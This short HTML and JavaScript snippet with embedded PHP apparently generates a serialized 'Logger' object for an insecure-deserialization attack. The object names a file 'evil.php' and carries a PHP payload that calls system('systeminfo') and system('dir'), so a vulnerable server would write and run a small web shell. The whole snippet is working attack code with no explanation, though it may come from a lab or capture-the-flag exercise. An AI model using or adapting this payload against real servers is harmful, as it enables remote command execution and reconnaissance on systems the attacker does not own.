
<textArea id="SerializedLogger"  style="width:800px"></textArea>
<script type="text/javascript">

class Logger {
    constructor(fileName, serviceInformation) {
        this.fileName = fileName;
        this.serviceInformation = serviceInformation;
    }
}

var logger = new Logger("evil.php", <?php echo json_encode( "<?php system('systeminfo'); system('dir'); ?>"); ?>);
var serializedLogger = JSON.stringify(logger);
document.getElementById("SerializedLogger").value = serializedLogger;

</script>
